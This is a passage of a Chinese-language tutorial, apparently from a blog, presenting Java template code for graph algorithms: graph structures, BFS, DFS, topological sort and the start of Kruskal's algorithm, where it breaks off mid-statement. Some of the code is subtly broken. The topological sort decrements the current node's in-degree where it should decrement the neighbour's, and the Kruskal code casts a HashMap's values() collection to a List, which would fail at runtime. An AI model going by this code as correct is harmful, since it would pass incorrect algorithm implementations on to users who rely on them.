title="模板"></a>模板</h3><p>对于图的表达方式有很多，如邻接表法，邻接矩阵法，对于特定的问题也可以用一个数组，方式多种多样，但是图问题使用的算法是一样的，所以我们可以自己把一种表达方式练熟所有算法即可，将该表达方式作为模板，这样，遇到别的表达方式时，只需要将该表达方式转化为我们熟悉的模板即可</p><p>模板如下：</p><p><code>图结构</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Graph</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> nodes<span class="token punctuation">;</span> <span class="token comment">// 点集</span>    <span class="token keyword">public</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">></span></span> edges<span class="token punctuation">;</span><span class="token comment">// 边集</span>    <span class="token keyword">public</span> <span class="token class-name">Graph</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        nodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        edges <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>点结构</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> value<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> in<span class="token punctuation">;</span> <span class="token comment">// 入度</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> out<span class="token punctuation">;</span> <span class="token comment">// 出度</span>    <span class="token keyword">public</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> nexts<span class="token punctuation">;</span> <span class="token comment">// 从该点指向的点（指向该点的点不算）</span>    <span class="token keyword">public</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">></span></span> edges<span class="token punctuation">;</span> <span class="token comment">// 从该点指出去的边</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>        in <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        out <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        nexts <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        edges <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>边结构</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Edge</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> weight<span class="token punctuation">;</span> <span class="token comment">// 权重</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> from<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> <span class="token keyword">to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token keyword">int</span> weight<span class="token punctuation">,</span> <span class="token class-name">Node</span> from<span class="token punctuation">,</span> <span class="token class-name">Node</span> <span class="token keyword">to</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>weight <span class="token operator">=</span> weight<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>from <span class="token operator">=</span> from<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token keyword">to</span> <span class="token operator">=</span> <span class="token keyword">to</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这里不需要考虑有向还是无向，因为无向图就是特殊的有向图</p></blockquote><p>假设题目给定的表达方式如图</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm2_f3.png"></p><p>那么将该表达方式转化为模板代码如下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Graph</span> <span class="token function">createGraph</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> matrix<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Graph</span> graph <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Graph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> matrix<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Integer</span> weight <span class="token operator">=</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">Integer</span> from <span class="token operator">=</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">Integer</span> <span class="token keyword">to</span> <span class="token operator">=</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>from<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">Node</span> fromNode <span class="token operator">=</span> graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Node</span> toNode <span class="token operator">=</span> graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Edge</span> newEdge <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Edge</span><span class="token punctuation">(</span>weight<span class="token punctuation">,</span> fromNode<span class="token punctuation">,</span> toNode<span class="token punctuation">)</span><span class="token punctuation">;</span>        fromNode<span class="token punctuation">.</span>nexts<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>toNode<span class="token punctuation">)</span><span class="token punctuation">;</span>        fromNode<span class="token punctuation">.</span>out<span class="token operator">++</span><span class="token punctuation">;</span>        toNode<span class="token punctuation">.</span>in<span class="token operator">++</span><span class="token punctuation">;</span>        fromNode<span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>newEdge<span class="token punctuation">)</span><span class="token punctuation">;</span>        graph<span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>newEdge<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> graph<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="宽度优先遍历-1"><a href="#宽度优先遍历-1" class="headerlink" title="宽度优先遍历"></a>宽度优先遍历</h3><p>建立一个队列和一个哈希set，从给定节点开始，入队，出队，打印，入队的同时注意在哈希set里也将其加入，为了防止A指向C，C又指向A，死循环，可以理解为节点进入了set，就相当于已经注册了</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">BFS</span><span class="token punctuation">(</span><span class="token class-name">Node</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>queue<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> cur <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> next<span class="token operator">:</span>cur<span class="token punctuation">.</span>nexts<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>set<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>                queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="深度优先遍历"><a href="#深度优先遍历" class="headerlink" title="深度优先遍历"></a>深度优先遍历</h3><p>不使用队列，使用栈。从给定节点开始入栈，然后弹出，当遇到没有注册过的节点，将弹出的节点重新压入，将这个没有注册过的压入，注册之后，重新进行循环</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">DFS</span><span class="token punctuation">(</span><span class="token class-name">Node</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> cur <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> next<span class="token operator">:</span>cur<span class="token punctuation">.</span>nexts<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>set<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>                stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">;</span>                stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>next<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h3><p>即图中某些点依赖于其他的点，具体到问题中是需要先完成某些事，才能做其他的某些事，所以需要找到最先能够不依赖别的事情的事，完成它们，然后才能完成其他的事，这就形成了一个顺序，即为拓扑排序</p><blockquote><p>前提是没有环，即不存在事件A依赖于事件B，事件B又依赖于事件A</p></blockquote><p>如何解决？可以先找到入度为0的点，然后将从该点和该点指出去的线删掉，找到下一个入度为0的点，依次进行即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> <span class="token function">topologySort</span><span class="token punctuation">(</span><span class="token class-name">Graph</span> graph<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// value为节点当前剩余的入度</span>    <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 用于储存入度为0的节点</span>    <span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> zeroInQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> each<span class="token operator">:</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>each<span class="token punctuation">,</span> each<span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>each<span class="token punctuation">.</span>in <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> zeroInQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 至此找到了第一批入度为0的点</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>zeroInQueue<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> cur <span class="token operator">=</span> zeroInQueue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> next<span class="token operator">:</span>cur<span class="token punctuation">.</span>nexts<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>next<span class="token punctuation">,</span> temp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>temp <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> zeroInQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="最小生成树问题"><a href="#最小生成树问题" class="headerlink" title="最小生成树问题"></a>最小生成树问题</h3><p>即保证图连通，并且所有边加起来权重最小，下面的两个算法适用于无向图</p><h4 id="K-kruskal-算法"><a href="#K-kruskal-算法" class="headerlink" title="K (kruskal) 算法"></a>K (kruskal) 算法</h4><p>即初始状态下每个点为独立的一个集合，将所有边按权重从小到大排列，然后遍历整个边集，从最小的开始，如果边的from和to不在一个集合中，则合并为一个集合</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> mySets<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span><span class="token punctuation">></span></span> map<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">mySets</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> nodes<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> each<span class="token operator">:</span>nodes<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>each<span class="token punctuation">,</span> set<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isSameSet</span><span class="token punctuation">(</span><span class="token class-name">Node</span> from<span class="token punctuation">,</span> <span class="token class-name">Node</span> <span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> set1 <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> set2 <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> set1 <span class="token operator">==</span> set2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">union</span><span class="token punctuation">(</span><span class="token class-name">Node</span> from<span class="token punctuation">,</span> <span class="token class-name">Node</span> <span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> set1 <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> set2 <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> each<span class="token operator">:</span>set2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            set1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>each<span class="token punctuation">,</span> set1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> edgeComparator <span class="token keyword">implements</span> <span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">Edge</span> o1<span class="token punctuation">,</span> <span class="token class-name">Edge</span> o2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> o1<span class="token punctuation">.</span>weight <span class="token operator">-</span> o2<span class="token punctuation">.</span>weight<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">></span></span> <span class="token function">kruskal</span><span class="token punctuation">(</span><span class="token class-name">Graph</span> graph<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    mySets myset <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">mySets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">></span></span> pq <span class="token operator">=</span> 